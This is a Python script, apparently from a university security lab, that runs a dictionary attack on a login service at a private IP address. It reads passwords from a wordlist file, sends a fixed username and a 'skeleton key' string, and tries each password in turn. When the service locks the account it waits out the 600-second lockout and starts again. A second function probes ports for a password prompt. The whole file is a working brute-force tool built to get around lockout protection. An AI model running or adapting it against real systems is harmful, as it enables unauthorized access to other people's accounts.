import re
import socket
import time
import datetime

HOST = '192.168.1.10'
SKELETONKEY = 'Passepartout'
BYTES = 1024
CRUZID = 'bosdhill\n'

def create_dict():
     passwords = []
     fp = open("dictionary.txt", "r")
     for _, line in enumerate(fp):
          passwords.append(line.replace('\n',''))
     return passwords

# Assuming NO lockout
def crack_password(PORT, s):
     passwords = create_dict()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     s.sendall(SKELETONKEY)
     time.sleep(2)
     data = s.recv(BYTES)
     print("Data received: %s" % data)
     print("Sending username...")
     s.sendall(CRUZID)
     data = s.recv(BYTES)
     print("Data received: %s" % data)
     for password in passwords:
          print("\tSending password: %s" % password)
          s.sendall(password)
          data = s.recv(BYTES)
          print("\tData received: %s" % data)
          if data == "Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n" or data == '':
               print("Sleep for 602 seconds at %s" % str(datetime.datetime.now()))
               s.close()
               time.sleep(602)
               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               s.connect((HOST, PORT))
               s.sendall(SKELETONKEY)
               time.sleep(2)
               data = s.recv(BYTES)
               print("\tData received: %s" % data)
               print("\tSending username...")
               s.sendall(CRUZID)
               data = s.recv(BYTES)
               print("\tData received: %s" % data)
          elif data == "Incorrect password, goodbye.\n":
               print("\tThe password %s is incorrect." % password)
               data = None
          else:
               print("The password %s is correct!" % password)
               print("Data received: %s" % data)
               break

def try_ports():
     fp = open("out", "r")
     for _, line in enumerate(fp):
          port = re.findall("[0-9]{5}", line)
          PORT = int(port[0])
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((HOST, PORT))
          s.sendall(SKELETONKEY)
          time.sleep(2)
          data = s.recv(BYTES)
          s.sendall(CRUZID)
          data = s.recv(BYTES)
          if data == 'Password: ':
               print('Received %s from port %d' % (repr(data), PORT))
               crack_password(PORT, s)

if __name__ == "__main__":
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     crack_password(10247, s)







